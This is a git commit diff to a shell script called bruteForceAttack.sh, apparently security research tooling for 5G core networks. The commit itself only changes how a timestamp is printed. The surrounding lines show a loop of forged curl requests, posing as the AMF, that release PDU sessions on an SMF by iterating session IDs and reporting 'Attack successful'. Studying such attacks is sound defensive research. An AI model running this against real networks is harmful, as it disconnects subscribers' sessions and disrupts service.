80165c5c3c61416b89a0cba740aea94e9ec37136
UmakantKulkarni <UmakantKulkarni@users.noreply.github.com>
2024-05-15 13:02:45 -0400

    Update bruteForceAttack.sh

--- bruteForceAttack.sh
+++ bruteForceAttack.sh
@@ -9,7 +9,7 @@ do
         op=$(curl -s -o /dev/null -w "%{http_code}" --request POST -d '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}' -H "Content-Type: application/json" --http2-prior-knowledge  -A "AMF" http://$smf_ip/nsmf-pdusession/v1/sm-contexts/$i/release)
         if [ "$op" = "204" ]; then
             echo ""
-            echo "Time = $date"
+            echo "Time = `date`"
             echo "Attack successful for session with user context $i"
             echo "Interface-Type = Service-based"
             echo "Interface = AMF-SMF"
